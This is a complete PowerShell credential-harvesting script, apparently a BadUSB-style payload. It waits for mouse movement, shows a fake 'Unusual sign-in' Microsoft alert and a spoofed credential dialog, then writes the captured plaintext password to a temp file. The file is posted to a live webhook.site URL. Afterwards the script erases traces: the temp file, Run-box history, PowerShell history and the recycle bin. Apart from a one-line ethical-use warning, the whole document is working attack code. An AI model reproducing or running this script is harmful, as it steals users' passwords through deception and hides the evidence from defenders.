# Credential Harvester Script - Corrected Version
# WARNING: Use only for ethical testing/education. Unauthorized use is illegal.

$WebhookUrl = "https://webhook.site/75342571-78da-45fc-8f61-caf01ffc1f5f"
$FileName = "$env:USERNAME-$(Get-Date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
$SourceFilePath = "$env:TMP\$FileName"  # Definir o caminho do arquivo explicitamente

<#
.NOTES
    This is to generate the ui.prompt you will use to harvest their credentials
#>
function Get-Creds {
    do {
        $cred = $host.ui.PromptForCredential('Failed Authentication', '', [Environment]::UserDomainName + '\' + [Environment]::UserName, [Environment]::UserDomainName)
        $password = $cred.GetNetworkCredential().Password
        if ([string]::IsNullOrWhiteSpace($password)) {
            [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
            continue  # Use continue em vez de recursão para evitar stack overflow
        }
        $creds = $cred.GetNetworkCredential() | Out-String  # Use Out-String para texto puro
        return $creds
    } until ($true)  # Simplifique: loop até senha válida
}
#----------------------------------------------------------------------------------------------------
<#
.NOTES
    This is to pause the script until a mouse movement is detected
#>
function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position
    while ([System.Windows.Forms.Cursor]::Position -eq $originalPOS) {
        Start-Sleep -Milliseconds 100  # Cheque mais rápido, sem toggle desnecessário
    }
}
#----------------------------------------------------------------------------------------------------
# This script repeatedly presses the capslock button, this snippet will make sure capslock is turned back off
function Caps-Off {
    Add-Type -AssemblyName System.Windows.Forms
    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
    #If true, toggle CapsLock key, to ensure that the script doesn't fail
    if ($caps -eq $true){
        $key = New-Object -ComObject WScript.Shell
        $key.SendKeys('{CapsLock}')
    }
}
#----------------------------------------------------------------------------------------------------
<#
.NOTES
    This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
#>
Pause-Script
Caps-Off
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")
$creds = Get-Creds
#------------------------------------------------------------------------------------------------------------------------------------
<#
.NOTES
    This is to save the gathered credentials to a file in the temp directory
#>
$creds | Out-File -FilePath $SourceFilePath -Encoding UTF8
#------------------------------------------------------------------------------------------------------------------------------------
<#
.NOTES
    This is to upload your files to webhook.site
#>
$body = @{
    filename = $FileName
    content = Get-Content $SourceFilePath -Raw
} | ConvertTo-Json
try {
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json'
} catch {
    # Silently handle upload errors (e.g., no internet)
    Write-Output "Upload failed: $($_.Exception.Message)" | Out-Null
}
#------------------------------------------------------------------------------------------------------------------------------------
<#
.NOTES
    This is to clean up behind you and remove any evidence to prove you were there
#>
# Delete only the specific file (not entire Temp folder to avoid breaking other apps)
Remove-Item $SourceFilePath -Force -ErrorAction SilentlyContinue

# Delete run box history (requires admin privileges)
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f 2>$null

# Delete PowerShell history (check if path exists)
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
}

# Delete contents of recycle bin (requires admin privileges)
Clear-RecycleBin -Force -ErrorAction SilentlyContinue